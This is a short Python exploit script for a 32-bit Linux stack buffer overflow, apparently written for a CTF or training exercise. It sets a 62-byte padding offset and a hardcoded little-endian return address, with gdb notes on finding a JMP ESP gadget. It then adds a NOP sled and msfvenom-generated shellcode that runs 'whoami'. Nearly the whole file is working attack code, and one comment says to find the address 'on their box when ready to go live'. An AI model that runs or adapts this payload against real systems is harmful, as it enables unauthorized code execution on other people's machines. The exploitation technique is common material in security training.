#### Overflow Offset ####
## wiremask.eu
offset = "A" * 62

#### EIP Placeholder to verify control
#eip = "B" * 4

#### EIP in REVERSE ENDIAN ####
## env - gdb
## show env
## unset all environments (unset env EXAMPLE)
## run program and overflow
## info proc map
## find /b [hex after heap], [hex before stack], 0xff, 0xe4
#### THIS MUST BE DONE ON THEIR BOX WHEN READY TO GO LIVE ####
eip = "\xef\x59\xf6\xf7"
'''
0xf7 f6 59 ef
0xf7f662eb
0xf7f6649b
0xf7f66533
0xf7f66633
0xf7f66b3b
'''

#### NOP Slide Safety Blanket ####
nop = "\x90" * 10

#### Shellcode ####
#msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
buf =  b""
buf += b"\xda\xca\xbe\xce\x75\x6b\xa0\xd9\x74\x24\xf4\x5a"
buf += b"\x31\xc9\xb1\x0b\x31\x72\x19\x83\xea\xfc\x03\x72"
buf += b"\x15\x2c\x80\x01\xab\xe8\xf2\x84\xcd\x60\x28\x4a"
buf += b"\x9b\x97\x5a\xa3\xe8\x3f\x9b\xd3\x21\xdd\xf2\x4d"
buf += b"\xb7\xc2\x57\x7a\xc0\x04\x58\x7a\xb8\x6c\x37\x1b"
buf += b"\x2b\x05\xc7\x8c\xe0\x5c\x26\xff\x87"

#### Cyber Bullets Downrange Pew Pew ####
print(offset + eip + nop + buf)
